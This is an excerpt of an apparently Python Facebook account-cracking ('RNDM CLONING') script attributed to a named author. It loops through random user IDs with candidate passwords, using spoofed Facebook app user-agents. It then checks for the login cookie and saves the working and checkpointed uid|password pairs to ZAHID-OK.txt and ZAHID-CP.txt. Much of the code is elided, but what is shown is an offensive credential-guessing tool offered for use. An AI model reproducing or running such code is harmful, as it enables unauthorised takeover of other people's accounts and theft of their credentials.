...
for xd in range(10000):
	...
	a='Mozilla/5.0 (Linux; Android 8.1.0; TECNO CF8 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/336.0.0.11.99;]'
	...
	k='Mozilla/5.0 (Linux; Android 8.1.0; TECNO CF8 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/336.0.0.11.99;]'
...
→   Facebook   :  ZAHID ALI BHURGARI

→   Github     :  PRIVET

→   Tool Type  :  \x1b[1;92mRNDM CLONING

\x1b[1;92m→   Version    :  0.0.5
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/168.0.0.57.90;FBBV/103647182;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/vodafoneP;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/105161185]',}
            ...
            if 'c_user' in log_cookies:
                ...
                print('\033[1;32m[ZAHID-OK❤️] '+cid+'|'+ps+'\033[0;97m')

                open('ZAHID-OK.txt', 'a').write(uid+' | '+ps+ '\n')
                ...
                print('\033[1;31m[ZAHID-CP😭] '+uid+' | '+ps+'\x1b[1;97m')

                open('ZAHID-CP.txt', 'a').write(uid+' | '+ps+'\n')
        ...
        sys.stdout.write(f'\r[\033[1;97mZAHID\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
